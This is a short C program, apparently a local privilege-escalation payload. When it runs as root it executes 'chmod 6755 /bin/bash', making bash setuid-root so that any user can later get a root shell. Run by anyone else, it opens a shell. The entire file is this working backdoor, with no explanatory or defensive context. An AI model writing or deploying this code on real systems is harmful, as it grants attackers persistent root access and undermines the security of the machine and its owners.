#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
int main()
{
	if(getuid()==0)
	{
		system("chmod 6755 /bin/bash");
	}
	else
	{
		system("/bin/bash");
	}
	return 0;

}
